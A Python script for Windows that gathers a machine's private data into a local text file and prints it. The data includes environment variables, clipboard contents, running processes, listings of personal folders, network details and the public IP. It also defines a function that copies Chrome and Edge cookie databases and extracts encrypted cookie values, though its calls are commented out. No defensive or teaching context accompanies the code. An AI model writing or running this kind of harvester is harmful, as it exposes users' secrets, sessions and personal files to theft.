import os
import sys
import socket
import sqlite3
import json
import shutil
import platform
import psutil
import datetime
import winreg
import uuid  # <-- Added import for uuid
import ctypes
import tkinter as tk
import requests
import pkg_resources
from pathlib import Path


# Function to list all subdirectories in a given path
def list_subdirectories(path):
    try:
        return [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]
    except FileNotFoundError:
        return []

# Function to list contents of a directory
def list_directory_contents(path):
    try:
        return os.listdir(path)
    except FileNotFoundError:
        return []

# Get system information
username = os.getlogin()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
os_info = platform.uname()
env_vars = os.environ

# Get hardware information
cpu_info = psutil.cpu_times()
memory_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')
battery = psutil.sensors_battery()
cpu_freq = psutil.cpu_freq()
cpu_count_logical = psutil.cpu_count()
cpu_count_physical = psutil.cpu_count(logical=False)

# Get network information
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
net_info = psutil.net_if_addrs()
net_stats = psutil.net_if_stats()
net_io_counters = psutil.net_io_counters()

# Get software information
python_version = sys.version

# Installed packages
import pkg_resources
installed_packages = pkg_resources.working_set
installed_packages_list = sorted(["%s==%s" % (i.key, i.version) for i in installed_packages])

# Running processes
running_processes = [proc.info for proc in psutil.process_iter(['pid', 'name', 'username'])]

# Browser cookies (for Chrome and Edge)
def get_browser_cookies(browser):
    if browser == 'chrome':
        base_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
    elif browser == 'edge':
        base_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
    else:
        raise ValueError("Unsupported browser")

    profile_dirs = ['Default'] + list_subdirectories(base_path)
    cookies_path = None
    for profile in profile_dirs:
        potential_path = os.path.join(base_path, profile, 'Cookies')
        if os.path.exists(potential_path):
            cookies_path = potential_path
            break

    if cookies_path is None:
        raise FileNotFoundError(f"Cookies file not found in any profile directory under {base_path}")

    temp_cookies_path = os.path.join(Path.home(), f'{browser}_cookies_temp')
    shutil.copyfile(cookies_path, temp_cookies_path)

    conn = sqlite3.connect(temp_cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

    cookies = []
    for host_key, name, encrypted_value in cursor.fetchall():
        cookies.append({
            "host_key": host_key,
            "name": name,
            "encrypted_value": encrypted_value.hex()
        })

    cursor.close()
    conn.close()
    os.remove(temp_cookies_path)

    return cookies

#chrome_cookies = get_browser_cookies('chrome')
#edge_cookies = get_browser_cookies('edge')

# Get user files and directories
home_dir = Path.home()
home_files = list(home_dir.iterdir())
documents_dir = home_dir / 'Documents'
documents_files = list(documents_dir.iterdir())
pictures_dir = home_dir / 'Pictures'
pictures_files = list(pictures_dir.iterdir())
music_dir = home_dir / 'Music'
music_files = list(music_dir.iterdir())
videos_dir = home_dir / 'Videos'
videos_files = list(videos_dir.iterdir())

# Get system logs (Windows Event Logs)
def get_event_logs(logtype):
    import win32evtlog
    server = 'localhost'
    #hand = win32evtlog.OpenEventLog(server, logtype)
    #total = win32evtlog.GetNumberOfEventLogRecords(hand)
    #return total

#application_logs = get_event_logs('Application')
#security_logs = get_event_logs('Security')
system_logs = get_event_logs('System')

# Miscellaneous Information
def check_internet():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

internet_status = check_internet()
public_ip = requests.get('https://api.ipify.org').text
current_time = datetime.datetime.now()
screen_width = ctypes.windll.user32.GetSystemMetrics(0)
screen_height = ctypes.windll.user32.GetSystemMetrics(1)

root = tk.Tk()
root.withdraw()
clipboard_content = root.clipboard_get()

user_sessions = psutil.users()



# Format data for output
def format_list(lst):
    return '\n'.join([f"- {item}" for item in lst])

def format_dict(dct):
    return '\n'.join([f"{key}: {value}" for key, value in dct.items()])

with open("systeminfo.txt", "w") as file:
    file.write(f"Username: {username}\n")
    file.write(f"IP Address: {ip_address}\n")
    file.write(f"OS Information: {os_info}\n")
    file.write(f"Environment Variables:\n{format_dict(env_vars)}\n")
    file.write(f"CPU Information:\n{format_dict(cpu_info._asdict())}\n")
    file.write(f"Memory Information:\n{format_dict(memory_info._asdict())}\n")
    file.write(f"Disk Information:\n{disk_info}\n")
    file.write(f"Battery Information:\n{battery}\n")
    file.write(f"CPU Frequency: {cpu_freq}\n")
    file.write(f"Logical CPU Count: {cpu_count_logical}\n")
    file.write(f"Physical CPU Count: {cpu_count_physical}\n")
    file.write(f"MAC Address: {mac_address}\n")
    file.write(f"Network Interfaces:\n{format_dict(net_info)}\n")
    file.write(f"Network Statistics:\n{format_dict(net_stats)}\n")
    file.write(f"Network IO Counters:\n{format_dict(net_io_counters._asdict())}\n")
    file.write(f"Python Version: {python_version}\n")
    file.write(f"Installed Packages:\n{format_list(installed_packages_list)}\n")
    file.write(f"Running Processes:\n{format_list([f'PID: {proc["pid"]}, Name: {proc["name"]}, User: {proc["username"]}' for proc in running_processes])}\n")
    #file.write(f"Chrome Cookies:\n{json.dumps(chrome_cookies, indent=4)}\n")
    #file.write(f"Edge Cookies:\n{json.dumps(edge_cookies, indent=4)}\n")
    file.write(f"Home Directory Content:\n{format_list([str(file) for file in home_files])}\n")
    file.write(f"Documents Directory Content:\n{format_list([str(file) for file in documents_files])}\n")
    file.write(f"Pictures Directory Content:\n{format_list([str(file) for file in pictures_files])}\n")
    file.write(f"Music Directory Content:\n{format_list([str(file) for file in music_files])}\n")
    file.write(f"Videos Directory Content:\n{format_list([str(file) for file in videos_files])}\n")
    #file.write(f"Application Logs Count: {application_logs}\n")
   # file.write(f"Security Logs Count: {security_logs}\n")
    file.write(f"System Logs Count: {system_logs}\n")
    file.write(f"Internet Connection Status: {internet_status}\n")
    file.write(f"Public IP Address: {public_ip}\n")
    file.write(f"Current Date and Time: {current_time}\n")
    file.write(f"Screen Resolution: {screen_width}x{screen_height}\n")
    file.write(f"Clipboard Content: {clipboard_content}\n")
    file.write(f"User Login Sessions:\n{format_list([f'User: {user.name}, Terminal: {user.terminal}, Host: {user.host}, Logged in Time: {user.started}' for user in user_sessions])}\n")

# Print collected information
print(f"Username: {username}")
print(f"IP Address: {ip_address}")
print(f"OS Information: {os_info}")
print(f"Environment Variables: {env_vars}")
print(f"CPU Information: {cpu_info}")
print(f"Memory Information: {memory_info}")
print(f"Disk Information: {disk_info}")
print(f"Battery Information: {battery}")
print(f"CPU Frequency: {cpu_freq}")
print(f"Logical CPU Count: {cpu_count_logical}")
print(f"Physical CPU Count: {cpu_count_physical}")
print(f"MAC Address: {mac_address}")
print(f"Network Interfaces: {net_info}")
print(f"Network Statistics: {net_stats}")
print(f"Network IO Counters: {net_io_counters}")
print(f"Python Version: {python_version}")
print(f"Installed Packages: {installed_packages_list}")
print(f"Running Processes: {running_processes}")
#print(f"Chrome Cookies: {json.dumps(chrome_cookies, indent=4)}")
#print(f"Edge Cookies: {json.dumps(edge_cookies, indent=4)}")
print(f"Home Directory Content: {home_files}")
print(f"Documents Directory Content: {documents_files}")
print(f"Pictures Directory Content: {pictures_files}")
print(f"Music Directory Content: {music_files}")
print(f"Videos Directory Content: {videos_files}")
#print(f"Application Logs Count: {application_logs}")
#print(f"Security Logs Count: {security_logs}")
print(f"System Logs Count: {system_logs}")
print(f"Internet Connection Status: {internet_status}")
print(f"Public IP Address: {public_ip}")
print(f"Current Date and Time: {current_time}")
print(f"Screen Resolution: {screen_width}x{screen_height}")
print(f"Clipboard Content: {clipboard_content}")
print(f"User Login Sessions: {user_sessions}")


